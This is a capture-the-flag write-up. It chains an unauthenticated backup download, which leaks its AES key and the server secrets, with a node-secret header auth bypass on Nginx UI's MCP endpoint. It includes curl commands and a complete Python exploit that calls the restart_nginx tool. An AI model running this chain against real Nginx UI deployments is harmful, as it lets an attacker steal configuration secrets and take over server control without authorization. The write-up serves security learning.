# Writeup: MCPocalypse

## Flag

`KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)`

## Recon

`http://212.8.228.176:9000` is **Nginx UI** (port 8888 of one host is just a static CapyTech page; the real target is the panel on `:9000` of the other host). The login is locked, but a few unauth endpoints are exposed.

```bash
curl http://212.8.228.176:9000/api/install
# → {"lock":true,"timeout":false}
```

## Two-bug chain

### Bug 1 — `GET /api/backup` returns the encrypted backup *with the AES key in the response header*

The route is supposed to be guarded by `middleware.AuthRequired()`, but it leaks anyway. The full AES-256-CBC key+IV is handed back in `X-Backup-Security: <base64-key>:<base64-iv>`:

```bash
curl -i http://212.8.228.176:9000/api/backup -o backup.zip
# X-Backup-Security: <key_b64>:<iv_b64>
```

The outer zip contains `nginx-ui.zip` and `nginx.zip`, AES-CBC-encrypted with that key/IV. Decrypt with PyCryptodome → drop the PKCS#7 padding → both inflate to plain zips.

`nginx-ui.zip / app.ini` leaks everything we need:

```ini
[app]
JwtSecret = sicret-ctf-capy-key-2026
[node]
Secret    = sicret-ctf-capy-key-2026
[nginx]
RestartCmd = cat /flag.txt
ReloadCmd  = cat /flag.txt
```

The challenge actually replaces the nginx control commands with `cat /flag.txt`, so the MCP `restart_nginx` tool prints the flag.

### Bug 2 — Node-secret auth bypass on `/mcp`

`internal/middleware/middleware.go::AuthRequired()` short-circuits when the request carries a non-empty `X-Node-Secret` matching `settings.NodeSettings.Secret`. With the secret leaked from the backup we walk straight past auth.

(Side note: in this nginx-ui version `/mcp_message` is registered with `IPWhiteList()` only — no `AuthRequired()` — so once we have a sessionId from `/mcp`, the message channel needs no token at all.)

## Exploit

1. Open SSE on `/mcp` with `X-Node-Secret: sicret-ctf-capy-key-2026` → server emits `event: endpoint` with `?sessionId=…`.
2. POST JSON-RPC `initialize` + `notifications/initialized` to `/mcp_message?sessionId=…`.
3. POST `tools/call` with `"name":"restart_nginx"` — the result comes back over SSE.

```python
import requests, threading, time, urllib.parse as up
S = requests.Session(); S.trust_env = False
BASE = 'http://212.8.228.176:9000'
H = {'X-Node-Secret':'sicret-ctf-capy-key-2026'}

sid=[None]; events=[]
def reader():
    r = S.get(f'{BASE}/mcp', headers={**H,'Accept':'text/event-stream'}, stream=True, timeout=30)
    ev=None; buf=[]
    for line in r.iter_lines(decode_unicode=True):
        if line=='':
            data='\n'.join(buf); events.append((ev,data))
            if ev=='endpoint' and 'sessionId=' in data:
                sid[0]=up.parse_qs(up.urlparse(data).query)['sessionId'][0]
            ev=None; buf=[]
        elif line.startswith('event: '): ev=line[7:].strip()
        elif line.startswith('data: '):  buf.append(line[6:])

threading.Thread(target=reader, daemon=True).start()
while not sid[0]: time.sleep(0.2)

def send(p): S.post(f'{BASE}/mcp_message?sessionId={sid[0]}', json=p, timeout=10)

send({'jsonrpc':'2.0','id':1,'method':'initialize',
      'params':{'protocolVersion':'2024-11-05','capabilities':{},'clientInfo':{'name':'pwn','version':'0'}}})
send({'jsonrpc':'2.0','method':'notifications/initialized'})
send({'jsonrpc':'2.0','id':3,'method':'tools/call',
      'params':{'name':'restart_nginx','arguments':{}}})

time.sleep(2)
print(events[-1])
# → ('message', '{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text",
#                  "text":"KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)"}]}}')
```

## Notes

- The leaked `app.ini` has a comment that names the bug: *"/mcp_message (POST) skips AuthRequired() — the actual CVE-2026-33032 bug. IP whitelist is empty = allow-all."*
- The MCP tool list also exposes `nginx_config_*` (read/write) and `reload_nginx` — `reload_nginx` returns the same flag because `ReloadCmd` is rewritten the same way.
- We never had to brute-force `/api/login` (which rate-limits and bans IPs after 10 attempts).
